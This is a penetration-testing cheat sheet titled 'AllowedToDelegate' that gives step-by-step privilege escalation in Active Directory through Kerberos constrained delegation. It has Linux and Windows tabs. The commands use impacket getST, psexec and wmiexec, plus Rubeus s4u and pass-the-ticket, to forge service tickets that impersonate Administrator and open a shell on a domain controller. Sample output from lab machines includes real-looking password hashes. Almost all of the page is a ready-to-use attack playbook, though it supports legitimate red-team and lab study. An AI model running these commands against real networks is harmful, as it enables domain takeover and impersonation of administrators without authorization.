---
title: "AllowedToDelegate"
date: 2024-7-23
tags: ["Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "AllowedToDelegate", "Active Directory", "Windows", "AddAllowedtoAct", "AllowedToAct"]
---

### Privesc #1: Forge a Ticket

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Pre-Check

```console
# Password
impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console
# NTLM
impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC_IP> -hashes :<HASH> -no-pass
```

#### 2. Get a Service Ticket

```console
sudo ntpdate -s <DC_IP> && impacket-getST -dc-ip <DC_IP> -spn '<SERVICE>/<TARGET_DOMAIN>' -hashes :<HASH> -impersonate '<IMPERSONATE_USER>' '<DOMAIN>/<USER>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.intelligence.htb && impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator 'intelligence.htb/svc_int'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

#### 3. Convert Ticket \[Optional\]

```console
python3 rubeustoccache.py '<BASE64_TICKET>' '<IMPERSONATE_USER>.kirbi' '<IMPERSONATE_USER>.ccache'
```

```console {class="sample-code"}
python3 ~/Tools/RubeusToCcache/rubeustoccache.py 'doIG9DCCBv ---[SNIP]--- 9yZS5jb20=' 'administrator.kirbi' 'administrator.ccache'
╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
              By Solomon Sklash
          github.com/SolomonSklash
   Inspired by Zer1t0's ticket_converter.py

[*] Writing decoded .kirbi file to administrator.kirbi
[*] Writing converted .ccache file to administrator.ccache
[*] All done! Don't forget to set your environment variable: export KRB5CCNAME=administrator.ccache
```

#### 4. Remote

```console
export KRB5CCNAME='<CCACHE_FILE>'
```

```console {class="sample-code"}
$ export KRB5CCNAME=Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

```console
# psexec
sudo ntpdate -s <DC_IP> && impacket-psexec '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
```

```console {class="sample-code"}
$ impacket-psexec client.example.com/administrator@dc01.client.example.com -k -no-pass
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Requesting shares on dc01.client.example.com.....
[*] Found writable share ADMIN$
[*] Uploading file MOjmtmkC.exe
[*] Opening SVCManager on dc01.client.example.com.....
[*] Creating service NTdz on dc01.client.example.com.....
[*] Starting service NTdz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```console
# wmiexec
sudo ntpdate -s <DC_IP> && wmiexec.py '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.intelligence.htb && wmiexec.py -k -no-pass administrator@dc.intelligence.htb
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

<small>*Note: impacket-wmiexec may not work*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Add Delegate \[Optional\]

```console
# Import PowerView
. .\PowerView.ps1
```

```console
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount <USER>
```

#### 2. Check

```console
# Check msds-allowedtodelegateto
Get-NetUser -TrustedToAuth
```

{{< tab set1-2 tab1 active >}}Hash{{< /tab >}}{{< tab set1-2 tab2 >}}Kerberos{{< /tab >}}
{{< tabcontent set1-2 tab1 >}}

#### 3. Calculate Hash

```console
.\rubeus.exe hash /password:'<PASSWORD>' /user:'<USER>' /domain:<DOMAIN>
```

#### 4. Get a Service Ticket

```console
.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
```

```console {class="sample-code"}
.\rubeus.exe s4u /user:'MS01$' /rc4:7ddf32e17a6ac5ce04a8ecbf782ca509 /impersonateuser:administrator /msdsspn:"cifs/dc01.client.example.com" /nowrap /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: S4U

[*] Using rc4_hmac hash: 7ddf32e17a6ac5ce04a8ecbf782ca509
[*] Building AS-REQ (w/ preauth) for: 'CLIENT.EXAMPLE.COM\MS01$'
[*] Using domain controller: 172.16.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFljCCBZKg ---[SNIP]--- hPUkUuQ09N

[*] Action: S4U

[*] Building S4U2self request for: 'MS01$@CLIENT.EXAMPLE.COM'
[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
[*] Sending S4U2self request to 172.16.1.2:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'MS01$@CLIENT.EXAMPLE.COM'
[*] base64(ticket.kirbi):

      doIGGjCCBh ---[SNIP]--- cbBU1TMDIk

[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.client.example.com'
[*] Building S4U2proxy request for service: 'cifs/dc01.client.example.com'
[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
[*] Sending S4U2proxy request to domain controller 172.16.1.2:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc01.client.example.com':

      doIG9DCCBv ---[SNIP]--- 9yZS5jb20=
[+] Ticket successfully imported!
```

```console
# Or Create a sacrificial process
.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
```

{{< /tabcontent >}}
{{< tabcontent set1-2 tab2 >}}

#### 3. Request a TGT

```console
.\rubeus.exe tgtdeleg /nowrap /ptt
```

#### 4. Get a Service Ticket

```console
.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
```

```console
# Or Create a sacrificial process
.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
```

{{< /tabcontent >}}

#### 5. Remote

```console
# Check
klist
```

```console
# Create session
$session = new-pssession -computername <COMPUTER_NAME>
```

```console
# Execute cmd
invoke-command $session { <CMD> }
```

{{< /tabcontent >}}
